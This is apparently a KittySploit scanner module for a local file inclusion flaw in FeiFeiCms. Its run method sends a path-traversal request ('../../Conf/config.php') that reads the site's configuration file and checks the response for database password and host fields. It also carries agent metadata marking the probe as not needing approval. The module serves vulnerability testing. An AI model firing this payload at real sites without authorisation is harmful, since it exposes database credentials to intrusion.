#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FeiFeiCms is vulnerable to local file inclusion."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FeiFeiCms - Local File Inclusion Detection',
        'description': 'FeiFeiCms is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'feifeicms', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.cnblogs.com/jinqi520/p/10202615.html', 'https://gitee.com/daicuo/feifeicms'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?s=Admin-Data-down&id=../../Conf/config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<?php', 'db_name', 'db_pwd', 'db_host',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="FeiFeiCms - Local File Inclusion detected",
                path='/index.php?s=Admin-Data-down&id=../../Conf/config.php',
            )
            return True
        return False

